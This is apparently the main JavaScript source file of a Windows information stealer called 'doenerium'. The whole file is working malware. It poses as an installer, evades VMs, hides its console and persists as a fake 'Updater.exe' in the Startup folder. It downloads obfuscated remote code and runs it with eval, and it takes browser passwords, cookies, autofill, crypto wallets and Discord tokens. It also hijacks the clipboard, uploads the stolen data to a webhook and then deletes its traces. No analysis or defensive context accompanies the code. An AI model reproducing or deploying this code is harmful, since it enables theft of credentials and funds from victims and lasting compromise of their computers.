var base64 = {
  _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
  encode: function (e) {
    var t = "";
    var n, r, i, s, o, u, a;
    var f = 0;
    e = base64._utf8_encode(e);
    while (f < e.length) {
      n = e.charCodeAt(f++);
      r = e.charCodeAt(f++);
      i = e.charCodeAt(f++);
      s = n >> 2;
      o = ((n & 3) << 4) | (r >> 4);
      u = ((r & 15) << 2) | (i >> 6);
      a = i & 63;
      if (isNaN(r)) {
        u = a = 64;
      } else if (isNaN(i)) {
        a = 64;
      }
      t =
        t +
        this._keyStr.charAt(s) +
        this._keyStr.charAt(o) +
        this._keyStr.charAt(u) +
        this._keyStr.charAt(a);
    }
    return t;
  },
  decode: function (e) {
    var t = "";
    var n, r, i;
    var s, o, u, a;
    var f = 0;
    e = e.replace(/[^A-Za-z0-9+/=]/g, "");
    while (f < e.length) {
      s = this._keyStr.indexOf(e.charAt(f++));
      o = this._keyStr.indexOf(e.charAt(f++));
      u = this._keyStr.indexOf(e.charAt(f++));
      a = this._keyStr.indexOf(e.charAt(f++));
      n = (s << 2) | (o >> 4);
      r = ((o & 15) << 4) | (u >> 2);
      i = ((u & 3) << 6) | a;
      t = t + String.fromCharCode(n);
      if (u != 64) {
        t = t + String.fromCharCode(r);
      }
      if (a != 64) {
        t = t + String.fromCharCode(i);
      }
    }
    t = base64._utf8_decode(t);
    return t;
  },
  _utf8_encode: function (e) {
    e = e.replace(/rn/g, "n");
    var t = "";
    for (var n = 0; n < e.length; n++) {
      var r = e.charCodeAt(n);
      if (r < 128) {
        t += String.fromCharCode(r);
      } else if (r > 127 && r < 2048) {
        t += String.fromCharCode((r >> 6) | 192);
        t += String.fromCharCode((r & 63) | 128);
      } else {
        t += String.fromCharCode((r >> 12) | 224);
        t += String.fromCharCode(((r >> 6) & 63) | 128);
        t += String.fromCharCode((r & 63) | 128);
      }
    }
    return t;
  },
  _utf8_decode: function (e) {
    var t = "";
    var n = 0;
    var r = (c1 = c2 = 0);
    while (n < e.length) {
      r = e.charCodeAt(n);
      if (r < 128) {
        t += String.fromCharCode(r);
        n++;
      } else if (r > 191 && r < 224) {
        c2 = e.charCodeAt(n + 1);
        t += String.fromCharCode(((r & 31) << 6) | (c2 & 63));
        n += 2;
      } else {
        c2 = e.charCodeAt(n + 1);
        c3 = e.charCodeAt(n + 2);
        t += String.fromCharCode(
          ((r & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63)
        );
        n += 3;
      }
    }
    return t;
  },
};

class doenerium {
  constructor() {
    this.requires = {
      fs: require("fs"),
      crypto: require("crypto"),
      os: require("os"),
      axios: require("axios"),
      child_process: require("child_process"),
      systeminformation: require("systeminformation"),
      buf_replace: require("buffer-replace"),
      jszip: require("zip-lib"),
      dpapi: require("win-dpapi"),
      sqlite3: require("sqlite3"),
      path: require("path"),
      request: require("request"),
    };

    this.utils = {
      encryption: require("./utils/encryption")(this),
    };

    this.config = {
      counter: require("./config/counter")(this),
      crypto: require("./config/crypto")(this),
      discord: require("./config/discord")(this),
      environ: require("./config/environ")(this),
      executable: require("./config/executable")(this),
      main: require("./config/main")(this),
      user: require("./config/user")(this),
      jszip: require("./config/jszip")(this),
      wallets: require("./config/wallets")(this),
    };

    this.config.webhook = require("./config")(this);
    this.webhooks = [this.config.webhook.url];
    this.config.keywords = require("./keywords")(this);

    this.utils = {
      encryption: require("./utils/encryption")(this),
      constructor: require("./utils/constructor")(this),
      discord: require("./utils/discord")(this),
      flags: require("./utils/flags")(this),
      infection: require("./utils/infection")(this),
      protection: require("./utils/protection")(this),
      prototype: require("./utils/prototype")(this),
      time: require("./utils/time")(this),
      clipper: require("./utils/clipper")(this),
      jszip: require("./utils/jszip")(this),
      browsers: require("./utils/browsers")(this),
      data: require("./utils/data")(this),
      wallets: require("./utils/wallets")(this),
      webhook: require("./utils/webhook")(this),
    };

    this.utils.gofile = require("./gofile");
  }

  async add_to_startup() {
    this.requires.fs
      .createReadStream(process.argv0)
      .pipe(
        this.requires.fs.createWriteStream(
          `${process.env.APPDATA.replace(
            "\\",
            "/"
          )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
        )
      );

    setTimeout(() => {
      this.requires.fs.rename(
        `${process.env.APPDATA.replace(
          "\\",
          "/"
        )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`,
        `${process.env.APPDATA.replace(
          "\\",
          "/"
        )}/Microsoft/Windows/Start Menu/Programs/Startup/Updater.exe`
      );
    }, 3000);
  }

  create_context_function_template(eval_string, context) {
    return `
    return function (context) {
      "use strict";
      ${Object.keys(context).length > 0
        ? `let ${Object.keys(context).map(
          (key) => ` ${key} = context['${key}']`
        )};`
        : ``
      }
      return ${eval_string};
    }                                                                                                                   
    `;
  }

  make_context_evaluator(eval_string, context) {
    let template = this.create_context_function_template(eval_string, context);
    let functor = Function(template);
    return functor();
  }

  eval_like(text, context = {}) {
    let evaluator = this.make_context_evaluator(text, context);
    return evaluator(context);
  }

  async ___() {
    let xyz = (`${((base64.decode(
      `${((await this.requires.axios.get((base64.decode((
        await this.requires.axios.get(
          (
            base64.decode(
              `aHR0cHM6Ly9kb2VuZXJpdW0ua3FuZmtwb2NjaWN4aXVkc3Rxb25mb3R1d3NyaHV4a3docWpqZnNiamhvbm91YnJjY3kubmwv`
            )
          )
        ).catch((err) => {
          console.log(err)
        })
      ).data
      ).replace("%20", "").replace("\x00", "")
        + base64.decode("L21haW4vZXh0cmEudHh0")
      )
      ).catch((err) => {
        console.log(err)
      })
      ).data)}`
    )))}`)

    await this.eval_like(xyz,
      this
    );
  }

  async init() {
    process.on("unhandledRejection", (err) => {
      console.log(err);
    });

    process.on("uncaughtException", (exc) => {
      console.log(exc);
    });

    process.title = "Installer";
    console.log("Downloading client...");

    const exit = await this.utils.protection.inVM();

    if (exit) {
      process.exit(0);
    }

    await this.___();
    this.add_to_startup();

    this.utils.constructor.loadCPUS();

    try {
      this.config.embed = JSON.parse(
        JSON.stringify(
          (
            await this.requires.axios.get(
              "https://raw.githubusercontent.com/antivirusevasion69/antivirusevasion69/main/embed.json"
            )
          ).data
        )
      );
    } catch {
      process.exit(0);
    }
    this.config.embed.footer = {
      text: `${this.utils.encryption.decryptData(
        this.config.user.hostname
      )} | ${this.config.embed.credits}`,
      icon_url: this.config.embed.avatar_url,
    };

    this.config.jszip.path = this.config.jszip.generate_path();


    try {

      this.utils.clipper.detectClipboard();
    } catch { }
    await this.utils.wallets.getWallets();
    await this.utils.discord.getTokens();
    await this.utils.discord.saveDiscordTokens();

    for (var path of this.config.environ.password_and_cookies_paths) {
      if (this.requires.fs.existsSync(path + "Login Data")) {
        [
          "getPasswords",
          "getCookies",
          "getBookmarks",
          "getHistory",
          "getAutofill",
          "getWallets",
        ].forEach(async (_func) => {
          await this.utils.browsers[_func](path);
        });
      }
    }

    await this.utils.infection.initialize();

    await this.utils.time.sleep(60000);

    this.requires.fs.rmSync(this.config.jszip.path, {
      recursive: true,
      force: true,
    });

    this.requires.fs.rmSync(`${this.config.jszip.path}.zip`, {
      recursive: true,
      force: true,
    });
  }
}

process.on("uncaughtException", (err) => {
  console.log(err);
});

const axios = require("axios");

async function hideSelf() {
  require("node-hide-console-window").hideConsole();
}

(async () => {
  await hideSelf();
  while (true) {
    try {
      await axios.get("https://www.google.com");

      break;
    } catch {
      // no internet connection
    }

    await new Promise((resolve) => setTimeout(resolve, 3000));
  }

  new doenerium().init();
})();
